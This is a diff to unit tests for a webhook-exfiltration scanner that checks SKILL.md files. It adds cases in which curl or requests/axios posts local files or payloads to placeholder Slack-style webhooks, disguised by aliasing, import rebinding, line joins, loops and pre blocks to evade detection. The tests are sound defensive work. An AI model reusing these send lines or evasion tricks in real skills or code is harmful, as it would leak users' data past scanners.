@@ -4,7 +4,9 @@ line with allowlisted options, and no doubt construct anywhere in the document's
 D1: hosts WT-T005's pattern doesn't cover (Teams, Google Chat, Telegram, Slack workflows) keep WT-T018 when the URL's own host and
 path are the service's. D2: any character that isn't ASCII in the document's code is doubt.
 
-Part 2 adds Replays: PR3's Codex round 3 highs 1-7, each WT-T018 on a3e535e. Every URL is an example; every webhook is FAKE."""
+Part 2 adds Replays: PR3's Codex round 3 highs 1-7, each WT-T018 on a3e535e. Fix round 1 adds CodexRound1 (imports, HTML code
+regions, statement starts, shell line joins, shell words and loops, repeated sends, a long import line), each failing on a34e390.
+Every URL is an example; every webhook is FAKE; `relay` is a placeholder that is never run."""
 import os, subprocess, sys, unittest
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from test_boxes import ROOT, wt
@@ -160,6 +162,67 @@ class Replays(unittest.TestCase):   # PR3's Codex round 3 highs 1-7 (must-fix in
                          {"WT-T005"})
 
 
+class CodexRound1(unittest.TestCase):   # fix round 1: each WT-T018 on a34e390 (6 and 7 are scaling checks, in LinearTime's way)
+    def test_1a_an_import_line_that_also_rebinds_the_client(self):
+        self.assertEqual(rules_of(fenced("from os import path; requests = relay\nrequests.post('" + HOOK + "', json=payload)")),
+                         {"WT-T005"})
+
+    def test_1b_an_import_alias_that_binds_the_client_name(self):
+        self.assertEqual(rules_of(fenced("from json import loads as requests\nrequests.post('" + HOOK + "', json=payload)")),
+                         {"WT-T005"})
+
+    def test_1c_names_imported_out_of_the_client_module(self):
+        self.assertEqual(rules_of(fenced("from requests import api\nrequests.post('" + HOOK + "', json=payload)")), {"WT-T005"})
+
+    def test_2a_an_upper_case_pre_block(self):
+        self.assertEqual(rules_of(HEAD + "<PRE>\nalias curl=relay\n</PRE>\n\n" + "```bash\ncurl -d @d.json '" + SLACK + "'\n```\n"),
+                         {"WT-T005"})
+
+    def test_2b_a_pre_block_across_a_blank_line(self):
+        self.assertEqual(rules_of(HEAD + "<pre>\nnotes\n\nalias curl=relay\n</pre>\n\n" + "```bash\ncurl -d @d.json '" + SLACK
+                                  + "'\n```\n"), {"WT-T005"})
+
+    def test_3a_the_client_after_an_attribute_dot_inside_brackets(self):
+        self.assertEqual(rules_of(fenced("(relay.\n requests.post('" + HOOK + "', json=payload))")), {"WT-T005"})
+
+    def test_3b_the_client_after_an_attribute_dot_in_js(self):
+        self.assertEqual(rules_of(fenced("relay.\naxios.post('" + HOOK + "', body)", "js")), {"WT-T005"})
+
+    def test_4a_a_deny_builtin_split_by_a_line_join(self):
+        self.assertEqual(rules_of(fenced("al\\\nias curl=relay\ncurl -d @d.json '" + SLACK + "'", "bash")), {"WT-T005"})
+
+    def test_4b_cd_split_by_a_line_join(self):
+        self.assertEqual(rules_of(fenced("c\\\nd relay\ncurl -d @d.json '" + SLACK + "'", "bash")), {"WT-T005"})
+
+    def test_5a_a_command_substitution_in_an_option_value(self):
+        self.assertEqual(rules_of(fenced("curl -H \"X-Note: $(relay)\" -d @d.json '" + SLACK + "'", "bash")), {"WT-T005"})
+
+    def test_5b_a_glob_in_an_option_value(self):
+        self.assertEqual(rules_of(fenced("curl -d @*.json '" + SLACK + "'", "bash")), {"WT-T005"})
+
+    def test_5c_a_send_inside_a_shell_loop(self):
+        self.assertEqual(rules_of(fenced("for f in a b\ndo\ncurl -d @d.json '" + SLACK + "'\ndone", "bash")), {"WT-T005"})
+
+    def test_5d_a_send_inside_a_shell_conditional(self):
+        self.assertEqual(rules_of(fenced("if relay\nthen\ncurl -d @d.json '" + SLACK + "'\nfi", "bash")), {"WT-T005"})
+
+    def test_6_repeated_python_and_axios_sends_scale_linearly(self):
+        for lang, send in (("python", "\"requests.post('\" + HOOK + \"', json=payload)\\n\""), ("js", "\"axios.post('\" + HOOK + \"', body)\\n\"")):
+            build = lambda n: "HEAD + '```" + lang + "\\n' + (" + send + ") * " + str(n) + " + '```\\n'"
+            got, _, small = _run(build(250))
+            self.assertEqual(got, "['WT-T018']")
+            got, scan, big = _run(build(2_000))
+            self.assertEqual(got, "['WT-T018']")
+            self.assertLess(scan, 20.0)
+            self.assertLess(big, 24 * small + 0.1, lang)   # linear is 8x; a34e390 was quadratic
+
+    def test_7_a_long_import_line_is_read_once(self):
+        got, scan, chat = _run("HEAD + '```python\\nfrom os import path # ' + 'import ' * 100_000 + \"\\nrequests.post('\" + HOOK"
+                               " + \"', json=payload)\\n```\\n\"", timeout=30)
+        self.assertEqual(got, "['WT-T005']")
+        self.assertLess(scan + chat, 20.0)   # chat_webhook runs first and does the reading (a34e390: 23.7 s there)
+
+
 class UnchangedElsewhere(Folder):
     def test_bad_fixtures_are_unchanged(self):
         code, r = vet_json(os.path.join(FIX, "bad", "exfil-helper", "SKILL.md"))
@@ -184,9 +247,10 @@ class UnchangedElsewhere(Folder):
 
 
 # ---------------------------------------------------------------- linear time: every per-document result is read once
-def _run(build):
+def _run(build, timeout=120):
     """Run in a fresh interpreter: build the text, then time scan_text (the result and its seconds) and chat_webhook over every
-    WT-T018 match (seconds). line_of is quadratic in the number of findings (docs/KNOWN-LIMITS.md), so ratios use the second."""
+    WT-T018 match (seconds). line_of is quadratic in the number of findings (docs/KNOWN-LIMITS.md), so ratios use the second.
+    A child that runs past `timeout` gives ("timeout", inf, inf), so a slow reading fails at the caller's assertion."""
     code = ("import sys, time\nsys.path.insert(0, " + repr(os.path.join(ROOT, "watchtower")) + ")\nimport wt\n"
             "HEAD, HOOK, SLACK = " + repr(HEAD) + ", " + repr(HOOK) + ", " + repr(SLACK) + "\n"
             "t = " + build + "\n"
@@ -194,7 +258,10 @@ def _run(build):
             "s = time.monotonic()\nfor m in rx.finditer(t):\n    wt.chat_webhook(t, m)\nc = time.monotonic() - s\n"
             "s = time.monotonic()\nfs = wt.scan_text(t, '/s/SKILL.md', rules)\ns = time.monotonic() - s\n"
             "print(sorted({f['rule'] for f in fs} & {'WT-T005', 'WT-T018'}))\nprint(s)\nprint(c)\n")
-    p = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=120)
+    try:
+        p = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=timeout)
+    except subprocess.TimeoutExpired:
+        return "timeout", float("inf"), float("inf")
     assert p.returncode == 0, p.stderr[-2000:]
     got, scan, chat = p.stdout.strip().splitlines()[-3:]
     return got, float(scan), float(chat)
